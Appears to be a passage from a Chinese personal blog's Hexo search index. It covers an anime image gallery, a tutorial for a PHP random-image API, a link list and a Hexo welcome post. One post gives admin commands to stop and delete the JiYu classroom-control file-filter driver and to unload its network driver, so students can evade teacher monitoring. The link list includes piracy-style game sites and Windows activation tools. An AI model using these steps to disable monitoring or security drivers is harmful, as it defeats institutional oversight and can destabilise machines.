href='https://api.xieweiling.top/?imgtype=random&tags=可爱'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=丝袜' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">丝袜</div>  <p>点击前往</p>  <a href='https://api.xieweiling.top/?imgtype=random&tags=丝袜'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=泳装' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">泳装</div>  <p>点击前往</p>  <a href='https://api.xieweiling.top/?imgtype=random&tags=泳装'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype=pc&tags=兽耳' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">兽耳</div>  <p>点击前往</p>  <a href='https://api.xieweiling.top/?imgtype=random&tags=兽耳'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://api.xieweiling.top/?imgtype==pc&size=medium&?1' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">其他分类请前往API文档查看</div>  <p>点击前往</p>  <a href='https://xieweiling.top/API'></a>  </figcaption>  </figure>  </div>]]></content>
      
      
      
        <tags>
            
            <tag> 网站推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何搭建一个自己的免费随机图片api接口</title>
      <link href="/blog/2022/05/28/01/"/>
      <url>/blog/2022/05/28/01/</url>
      
        <content type="html"><![CDATA[<h1 id="这里介绍两种存储图片的方法："><a href="#这里介绍两种存储图片的方法：" class="headerlink" title="这里介绍两种存储图片的方法："></a>这里介绍两种存储图片的方法：</h1><p><font color=red>两种方法都基于宝塔面板来进行搭建</font></p><h2 id="第一种：GitHub-jsdelivr"><a href="#第一种：GitHub-jsdelivr" class="headerlink" title="第一种：GitHub+jsdelivr"></a>第一种：GitHub+jsdelivr</h2><p>这个方法最简单，但是GitHub现在只能放不超过50MB的图片，超过50MB的话jsdelivr就不能CDN缓存加速</p><h3 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h3><p>打开GitHub，新建一个存储库<br><img src="https://img.beiko.top/blog/2022/05/28/image-1.png" alt="图1"><br>存储库名字随便填，但是一定要选择公开存储库，最后选择新建存储库</p><h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><p>准备好自己喜欢的图片，然后按照1-100的顺序命名（如果命名好了就可以跳过这一步）<br>就像这样：<br><img src="https://img.beiko.top/blog/2022/05/28/image-2.png" alt="图2"><br>如果没有按照1-100命名，就推荐用<a href="https://cloud.xieweiling.top/Windows%E8%BD%AF%E4%BB%B6/%E5%AE%9E%E7%94%A8%E8%BD%AF%E4%BB%B6/renamer-7.3.exe">ReNamer</a> 进行重命名（这里主要是为了后面给图片套jsdelivr加速更加方便）</p><h4 id="图片重命名"><a href="#图片重命名" class="headerlink" title="图片重命名"></a>图片重命名</h4><p>安装好软件后添加规则：</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-3.png" alt="图3"></p><p>选择序列化，按照图4设置，然后点击保存规则</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-4.png" alt="图4"></p><p>接下来把自己的图片拉到软件里面，点击重命名就可以了</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-5.png" alt="图5"></p><h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><p>把这些图片上传到GitHub<br>最好先压缩一下图片，这里推荐用图压 官网：<a href="https://tuya.xinxiao.tech/">https://tuya.xinxiao.tech/</a><br>压缩好后上传GitHub（这里就不用我教了吧）</p><p><font color=red>注意：图片名字最好命名好后再上传，这边只是方便后面利用jsdelivr进行加速！！！</font></p><h2 id="第二种：利用又拍云来存储图片"><a href="#第二种：利用又拍云来存储图片" class="headerlink" title="第二种：利用又拍云来存储图片"></a>第二种：利用又拍云来存储图片</h2><p>这种方法的好处就是访问速度飞快，但坏处就是，想白嫖的话，一个月只有15个g的流量，不过还会有10g的存储空间（感觉个人博客的话已经够用了）</p><h3 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h3><p>打开又拍云官网：<a href="https://www.upyun.com/">https://www.upyun.com/</a> 注册一个账号先<br>然后选择又拍云联盟</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-9.png" alt="图6"></p><p>按照里面的步骤加入又拍云联盟，其实就是在你的博客网站下面挂个小小的广告，几乎没什么影响</p><h3 id="加入成功后"><a href="#加入成功后" class="headerlink" title="加入成功后"></a>加入成功后</h3><p>打开又拍云控制台<br>新建一个云存储服务，名字随便填，剩下的按照下图选择</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-8.png" alt="图7"></p><p>新建完成后，就可以上传图片了<br>可以利用又拍云给你的 域名/1.jpg 进行访问测试<br>不过如果只用又拍云分发的域名来访问的话会有限制，最好绑定自己的域名<font color=red>（域名要备案）</font></p><h1 id="打开宝塔面板"><a href="#打开宝塔面板" class="headerlink" title="打开宝塔面板"></a>打开宝塔面板</h1><p>新建一个网站或者在原有网站里面新建一个名为api的文件夹，这里我是在原有网站里面加的</p><p><img src="https://img.beiko.top/blog/2022/05/28/image-6.png" alt="图8"></p><p>然后在里面新建两个文件 一个是xxx.php 另一个是xxx.txt （注：xxx指的是可以随便命名）</p><p>在xxx.php文件添加以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//存有美图链接的文件名xxx.txt</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;xxx.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件不存在&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//从文本获取链接</span></span><br><span class="line"><span class="variable">$pics</span> = [];</span><br><span class="line"><span class="variable">$fs</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$fs</span>))&#123;</span><br><span class="line">    <span class="variable">$line</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">fgets</span>(<span class="variable">$fs</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$line</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$pics</span>, <span class="variable">$line</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//从数组随机获取链接</span></span><br><span class="line"><span class="variable">$pic</span> = <span class="variable">$pics</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$pics</span>)];</span><br><span class="line"> </span><br><span class="line"><span class="comment">//返回指定格式</span></span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$type</span>)&#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//JSON返回</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/json&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;pic&#x27;</span>=&gt;<span class="variable">$pic</span>]));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$pic</span>&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改里面的xxx.txt为刚才创建的pc.txt(就改成刚才自己新建的xxx.txt)<br>最后打开xxx.txt放入图片地址</p><h1 id="图片链接"><a href="#图片链接" class="headerlink" title="图片链接"></a>图片链接</h1><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p>如果是GitHub的话这里我们需要利用jsdelivr加速图片，所以图片地址应该为：</p><figure class="highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://fastly.jsdelivr.net/gh/你的github名字/你刚才新建的存储库名字/1.jpg</span><br></pre></td></tr></table></figure><h2 id="又拍云"><a href="#又拍云" class="headerlink" title="又拍云"></a>又拍云</h2><p>如果是又拍云的话就是：</p><figure class="highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://你的域名/1.jpg</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的域名/1.jpg</span><br></pre></td></tr></table></figure><p>按照这格式先试一下能不能打开图片，如果打不开请检查前面的步骤有没有做错</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>如果能打开，就可以用Excel批量做出图片地址了（到这里你应该能明白上面命名的重要性了）<br>到这里只要访问 http://<font color=red>你的网站地址</font>/api/xxx.php/ 比如我的：<a href="https://blog.xieweiling.top/api/pc.php/">https://blog.xieweiling.top/api/pc.php/</a> （此链接已失效）<br><a href="https://api.xieweiling.top/">点击前往我的新API接口</a></p><p>如果能够正常出现图片的话，证明你成功了&gt;v&lt;</p><h2 id="欢迎使用我的API接口"><a href="#欢迎使用我的API接口" class="headerlink" title="欢迎使用我的API接口"></a>欢迎使用我的API接口</h2><p><a href="https://xieweiling.top/blog/API/">点击前往我的API接口文档</a></p><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>软件来源于网络，转载请标明出处</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你解除极域的控制轻松上课摸鱼</title>
      <link href="/blog/2022/05/13/02/"/>
      <url>/blog/2022/05/13/02/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>每当我们上课的时候，都会遇到电脑屏幕被控制的情况，下面就教你如何解除极域的控制，轻松摸鱼</p><h1 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h1><p>一个u盘</p><p>软件：<font color=red>JiYuTrainer</font>和<font color=red>Pyark</font> (软件下载见下文)</p><h1 id="下面开始教程："><a href="#下面开始教程：" class="headerlink" title="下面开始教程："></a>下面开始教程：</h1><h2 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h2><p>把u盘（带有上面两个软件）插入电脑。<br>这时极域可能不会让你读取u盘（如果能读取并且能把软件拷入电脑请忽略这一步）。<br>所以我们要把它TDFileFilter驱动删掉，删除方法如下：</p><p>win 7 ：打开 “开始菜单”栏搜索cmd，用管理员权限打开<br>win 10 ：直接在图1处找cmd，然后用管理员权限打开<br><img src="https://img.beiko.top/blog/2022/05/13/image-2.png" alt="图1"></p><p>然后在cmd里面输入以下代码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop TDFileFilter </span><br><span class="line">sc delete TDFileFilter </span><br></pre></td></tr></table></figure><p>出现下面图2的状态就证明成功了</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-3.png" alt="图2"><br>操作完后u盘就能读取了，然后就不用我说了吧（肯定是把两个软件拷进去啦）</p><h2 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h2><p>打开<font color=red>JiYuTrainer</font>然后极域就被控制了，这样老师就没办法控制你了。<br>但是我们的网络还是被控制住了，什么网站都打不开。<br>先别急，这时候另外一个软件就派上用场了。</p><h2 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h2><p>打开<font color=red>Pyark</font>里面的 <font color=red>.exe</font> 文件，打开后就是下面图3这个样子</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-4.png" alt="图3"></p><p>我们点击里面的驱动模块，找到里面的<font color=red>TDNetFilter.sys</font> 如下面图4所示</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-5.png" alt="图4"></p><p>右击鼠标选择卸载驱动 如下面图5所示（<font color=red>注：可能会导致关机时蓝屏</font>）</p><p><img src="https://img.beiko.top/blog/2022/05/13/image-6.png" alt="图5"></p><p>然后就可以开始你的摸鱼之旅吧^v^!（小心被老师发现然后GG）</p><h2 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h2><p><a href="https://cloud.xieweiling.top/d/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98/Windows%20%E8%BD%AF%E4%BB%B6%20%F0%9F%8C%9F%F0%9F%8C%9F%F0%9F%8C%9F/%E5%B9%B2%E6%8E%89%E6%9E%81%E5%9F%9F.zip?sign=jHrS_IyTJMP4zQ2nU4puqU0Dps5kpw4mbI_kvfWMMuI=:0">点击下载</a><br>解压密码：xieweiling.top</p><h1 id="声明"><a href="#声明" class="headerlink" title="声明:"></a>声明:</h1><p>软件来源于网络,本文仅是转载和简化，如有必要您可以通过评论的方式要求删除</p><p>如使用此教程后，出现什么问题概不负责</p>]]></content>
      
      
      
        <tags>
            
            <tag> 摸鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宝藏网站推荐</title>
      <link href="/blog/2022/04/10/00/"/>
      <url>/blog/2022/04/10/00/</url>
      
        <content type="html"><![CDATA[<h1 id="宝藏网站推荐"><a href="#宝藏网站推荐" class="headerlink" title="宝藏网站推荐"></a>宝藏网站推荐</h1><p>网络空间安全测绘：<a href="https://fofa.info/">https://fofa.info/</a></p><p>安卓软件大全：<a href="https://www.apkmirror.com/">https://www.apkmirror.com/</a></p><p>二次元图库：<a href="https://www.beiko.top/">https://www.beiko.top/</a></p><p>阿里云盘资源搜索社区：<a href="https://pan666.cn/">https://pan666.cn/</a></p><p>好用的内网穿透工具：<a href="https://www.natfrp.com/?page=panel&amp;module=proxies">https://www.natfrp.com/?page=panel&amp;module=proxies</a></p><p>免费域名：<a href="http://www.freenom.world/zh/index.html?lang=zh">http://www.freenom.world/zh/index.html?lang=zh</a></p><p>图片网站：<a href="https://pixabay.com/zh/">https://pixabay.com/zh/</a> &amp; <a href="https://wallhaven.cc/">https://wallhaven.cc</a></p><p>字符库：<a href="http://www.fontawesome.com.cn/">http://www.fontawesome.com.cn/</a></p><p>图床：<a href="https://sm.ms/">https://sm.ms/</a></p><p>Butterfly主题美化：<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>游戏白嫖地址：<a href="http://flysheep.ys168.com/">http://flysheep.ys168.com/</a></p><p>随机二次元老婆壁纸：<a href="https://api.xieweiling.top/">https://api.xieweiling.top/</a> </p><p>二次元老婆天堂：<a href="https://www.beiko.top/">https://www.beiko.top/</a> &amp; <a href="https://iw233.cn/">https://iw233.cn/</a></p><p>win10美化：<a href="https://zhutix.com/">https://zhutix.com/</a></p><p>刷机资源：<a href="https://kamiui.ml/">https://kamiui.ml/</a></p><p>Windows系统下载仓储站(包含激活工具): <a href="https://hellowindows.cn/">https://hellowindows.cn/</a></p><p>免费VPS：<a href="https://hax.co.id/">https://hax.co.id/</a></p><p>动漫生肉网：<a href="http://www.kisssub.org/">http://www.kisssub.org/</a></p><p>Switch游戏白嫖：<a href="https://games520.net/">https://games520.net/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/blog/2022/04/09/hello-world/"/>
      <url>/blog/2022/04/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
